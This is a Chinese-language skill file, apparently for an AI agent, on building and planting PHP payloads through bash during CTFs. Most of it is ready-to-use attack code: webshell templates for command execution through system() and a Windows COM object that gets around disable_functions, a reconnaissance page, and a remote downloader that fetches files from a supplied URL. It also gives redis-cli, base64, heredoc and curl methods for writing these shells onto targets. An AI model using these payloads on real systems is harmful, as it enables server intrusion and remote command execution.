---
name: php-payload-builder
description: |
  安全构造 PHP payload 的专项技能。解决 bash/shell 转义导致 PHP 代码损坏的问题，提供经过验证的 payload 模板。
  触发场景：用户需要通过 bash/shell 写入 PHP 文件（echo、printf、redis-cli -x、curl -d）、
  遇到 $_POST/$_GET 变量被 bash 展开、PHP 代码写入后不执行、disable_functions bypass、
  构造 webshell、构造诊断页、构造文件下载器、heredoc 写法、base64 编码写入时使用。
---

# PHP Payload Builder

你处理的是"如何在 bash/shell 命令中安全构造和写入 PHP 代码"这个问题。PHP payload 在 CTF 中失败的首要原因不是 payload 本身有问题，而是被 bash 的变量展开、引号嵌套、特殊字符解释破坏了。

## 核心铁律

1. **所有包含 `$` 的 PHP 代码，在 bash 中必须用单引号包裹或 base64 编码**。双引号中 `$_POST` 会被 bash 展开为空字符串。
2. **不要在 bash 双引号字符串中直接写 PHP 变量**。即使转义 `\$`，也容易遗漏或被二次解释。
3. **redis-cli -x 管道模式是最安全的写入方式**。`printf '%s' '<php_code>' | redis-cli -x SET key` 避免了 SET 命令行内的引号冲突。

## 安全写入方法（按推荐优先级）

### 方法 1: printf + 单引号（推荐，最简单）

```bash
printf '%s' '<?php echo $_POST["cmd"]; ?>' | redis-cli -h 127.0.0.1 -p <port> -x SET 1
```

**为什么安全**：单引号内 bash 不做任何展开，`$_POST` 原样传递。

### 方法 2: base64 编码写入

```bash
# 先编码
echo -n '<?php system($_POST["cmd"]." 2>&1"); ?>' | base64
# 输出: PD9waHAgc3lzdGVtKCRfUE9TVFsiY21kIl0uIiAyPiYxIik7ID8+

# 落地时解码
echo 'PD9waHAgc3lzdGVtKCRfUE9TVFsiY21kIl0uIiAyPiYxIik7ID8+' | base64 -d > /tmp/shell.php
```

**适用场景**：payload 中同时包含单引号和双引号时。

### 方法 3: heredoc（适合长 payload）

```bash
cat << 'PAYLOAD_EOF' > /tmp/shell.php
<?php
$cmd = $_POST['cmd'];
$s = new COM("WScript.Shell");
$e = $s->Exec("cmd /c " . $cmd);
echo $e->StdOut->ReadAll();
echo $e->StdErr->ReadAll();
?>
PAYLOAD_EOF
```

**关键**：heredoc 的标记必须用单引号包裹（`'PAYLOAD_EOF'`），否则内部 `$` 仍会被展开。

### 方法 4: curl + printf 写入远程 webshell

```bash
# 通过 webshell 的文件写入功能落地新 payload
curl -s -X POST http://<target>/existing_shell.php \
  --data-urlencode "cmd=echo '<?php system(\$_POST[\"cmd\"].\" 2>&1\"); ?>' > C:/path/to/new_shell.php"
```

**注意**：这里外层用单引号包 PHP，内层 `$_POST` 的 `$` 需要反斜杠转义（因为经过了 curl 的 URL 编码层）。

## 常用 Payload 模板

### 诊断页（必须第一个落地）

```php
<?php
echo "DIAG_START\n";
echo "php_ver: ".phpversion()."\n";
echo "os: ".PHP_OS."\n";
echo "disable_functions: ".ini_get("disable_functions")."\n";
echo "com_loaded: ".(class_exists("COM")?"yes":"no")."\n";
foreach(['system','exec','passthru','shell_exec','popen','proc_open'] as $f){
    echo $f."=".(function_exists($f)?"yes":"no")." ";
}
echo "\nDIAG_END";
?>
```

### 最小回显页（闭环验证用）

```php
<?php echo $_POST["cmd"]; ?>
```

### system() 命令执行页

```php
<?php set_time_limit(0); ini_set('max_execution_time','0'); system($_POST['cmd'].' 2>&1'); ?>
```

### COM 命令执行页（Windows disable_functions bypass）

```php
<?php
$s = new COM("WScript.Shell");
$e = $s->Exec("cmd /c " . $_POST['cmd']);
echo $e->StdOut->ReadAll();
echo $e->StdErr->ReadAll();
?>
```

### PHP 文件下载器（命令执行不稳定时退回此方案）

```php
<?php
$u=$_POST['url'];
$p=$_POST['path'];
$d=@file_get_contents($u);
echo "PHPDL\n";
if($d===false){ echo "fetch=fail\n"; }
else {
    echo "fetch_len=".strlen($d)."\n";
    $w=@file_put_contents($p,$d);
    echo "write_ret=".$w."\n";
    echo "exists=".(file_exists($p)?"yes":"no")."\n";
    if(file_exists($p)) echo "size=".filesize($p)."\n";
}
?>
```

## 禁止模式（绝对不要这样写）

```bash
# ❌ 双引号包裹含 $ 的 PHP — $_POST 被展开为空
echo "<?php system($_POST['cmd']); ?>" > shell.php

# ❌ 直接 redis-cli SET 含引号的 payload — 引号冲突
redis-cli SET 1 "<?php echo $_POST["cmd"]; ?>"

# ❌ curl -d 直接传含 $ 的代码 — 变量展开
curl -d "code=<?php system($_POST['cmd']); ?>" http://target/write.php

# ❌ 在已有双引号 printf 里嵌套 PHP 双引号
printf "<?php echo $_POST[\"cmd\"]; ?>"
```

## 调试检查清单

当 PHP payload 不工作时，按此顺序排查：

1. **bash 展开问题**：在本地先 `echo` 确认 payload 内容是否完整（`$_POST` 没被吃掉）
2. **引号嵌套**：确认最外层引号类型，内层引号不能同类型
3. **disable_functions**：先落诊断页确认哪些函数可用
4. **编码问题**：Redis RDB 写入的文件前导有二进制噪音，但不影响 PHP 解析
5. **路径问题**：确认文件写入路径正确，且 Web 服务可访问该路径
